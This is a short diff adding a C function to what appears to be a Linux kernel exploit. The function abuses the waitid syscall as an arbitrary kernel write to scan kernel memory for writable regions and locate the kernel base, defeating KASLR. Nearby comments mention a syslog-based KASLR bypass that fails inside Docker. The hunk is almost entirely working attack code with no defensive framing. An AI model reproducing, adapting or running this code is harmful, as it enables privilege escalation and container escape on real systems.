@@ -26,6 +26,44 @@ unsigned long get_kernel_base() {
   return -1;
 }
 
+void locate_first_writable() {
+	// first we try doing our arb write to find the system base address
+	// if syscall is 0 we didn't fault
+	
+	unsigned long start = 0xffffffff81000000;
+	unsigned long inc =   0x0000000000000010;
+	unsigned long last =   0xfffffffff0000000;
+
+	unsigned long guess = start;
+	size_t count = 0;
+	size_t w_start = 0;
+	size_t w_end = 0;
+	while (guess != 0) {
+		int res = syscall(SYS_waitid, P_ALL, 0, guess + start_rw_off, WEXITED, NULL);
+		if (w_start == 0){
+			if(errno != 14){
+				w_start = guess;
+				count ++;
+			}
+		}
+		else{
+			if(errno == 14){
+				// guess - inc is the end of the writeable position.
+				printf("[NO.%lu] %p - %p area is writable.\n", count, w_start, (guess - inc));
+				w_start = 0;
+			}
+		}
+		guess += inc;
+		if(guess >= last)
+			break;
+
+if(count > 0)
+	break;
+
+	}
+	return;
+}
+
 /* * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *
 // We don't have permission to do klogctl in Docker.
 
